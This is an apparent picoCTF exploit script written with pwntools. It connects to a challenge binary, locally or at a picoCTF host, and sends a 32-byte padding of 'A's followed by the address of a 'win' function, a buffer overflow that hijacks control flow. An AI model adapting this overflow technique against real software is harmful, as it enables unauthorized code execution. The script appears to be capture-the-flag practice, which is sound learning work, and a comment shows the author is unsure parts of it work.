#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("./chall")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("mimas.picoctf.net:57745") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    set sysroot /
    c
    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def main():
    # good luck pwning :)

    win_function_addr = exe.symbols['win']
    print(win_function_addr)
    p.recvuntil(b'choice: ')
    p.send(b"2")
    #Wait ?? Why does this not work?
    # p.recvuntil(b'Data for buffer: ')
    p.send(b"A"*32 + p64(win_function_addr))

    p.interactive()

if __name__ == "__main__":
    main()
